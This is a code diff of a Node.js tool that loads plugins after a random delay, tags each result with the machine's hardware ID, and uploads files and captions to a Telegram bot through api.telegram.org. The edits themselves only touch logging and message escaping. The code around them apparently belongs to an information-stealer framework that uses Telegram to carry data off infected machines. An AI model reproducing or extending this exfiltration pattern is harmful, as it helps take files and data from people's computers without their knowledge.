@@ -15,7 +15,9 @@ const delay = (ms = Math.floor(Math.random() * 30000 + 5000)) => {
 }
 
 function loadPlugins() {
-  return fs
+  console.log('Loading plugins...')
+
+  const plugins = fs
     .readdirSync(pluginsDir, { withFileTypes: true })
     .filter(
       dir =>
@@ -24,12 +26,15 @@ function loadPlugins() {
         fs.readdirSync(path.resolve(pluginsDir, dir.name)).includes('lib.js')
     )
     .reduce((acc, dir) => {
-      process.stdout.write(`  [${dir.name}]... `)
+      console.log(`  [${dir.name}]... `)
       const plugin = require(path.resolve(pluginsDir, dir.name, 'lib.js'))
-      console.log(`OK! ✌️`)
       acc[dir.name] = plugin
       return acc
     }, /** @type {{ [pluginName: string]: any }} */ ({}))
+
+  // prettier-ignore
+  console.log(`\nLoaded plugins: ${Object.keys(plugins).map(x =>`[${x}]`).join(', ')}`)
+  return plugins
 }
 
 /**
@@ -43,7 +48,7 @@ async function sendMessageTelegramWebhook(text, telegramChatId, telegramToken, r
   if (retriesLeft === 0) return
 
   const form = new FormData()
-  form.append('text', text.replace(/\./g, '\\.').replace(/\+/g, '\\+'))
+  form.append('text', text.replace(/\./g, '\\.').replace(/\+/g, '\\+').replace(/!/g, ''))
   const res = await fetch(
     `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&parse_mode=MarkdownV2`,
     {
@@ -81,7 +86,8 @@ async function sendDocumentTelegramWebhook(
 
   const form = new FormData()
   form.append('document', fs.createReadStream(filePath, {}), { filename })
-  form.append('caption', caption.replace(/\./g, '\\.').replace(/\+/g, '\\+'))
+  form.append('caption', caption.replace(/\./g, '\\.').replace(/\+/g, '\\+').replace(/!/g, ''))
+
   const res = await fetch(
     `https://api.telegram.org/bot${telegramToken}/sendDocument?chat_id=${telegramChatId}&parse_mode=MarkdownV2`,
     {
@@ -114,10 +120,7 @@ async function run(telegramChatId, telegramToken, addDelays = true) {
   // Wait before execution
   if (addDelays) await delay()
 
-  console.log('Loading plugins...')
   const plugins = loadPlugins()
-  // prettier-ignore
-  console.log(`\nLoaded plugins: ${Object.keys(plugins).map(x =>`[${x}]`).join(', ')}`)
 
   // Track plugin success
   const pluginSuccess = Object.keys(plugins).reduce((acc, pluginName) => {
@@ -129,7 +132,7 @@ async function run(telegramChatId, telegramToken, addDelays = true) {
   for (const [pluginName, plugin] of Object.entries(plugins)) {
     try {
       console.log(`\n\nRunning plugin [${pluginName}]! ⭐`)
-      const messageCaptionPrefix = `Plugin: \`[${pluginName}]\`\nHWID: \`${hwid.slice(0, 20)}\``
+      const messageCaptionPrefix = `Plugin: \`${pluginName}\`\nHWID: \`${hwid.slice(0, 20)}\``
 
       const uploadFileFn = (filePath, filename, caption) => {
         console.log(`[${pluginName}] uploaded a file via Telegram: \`${filename}\` - ${caption}`)
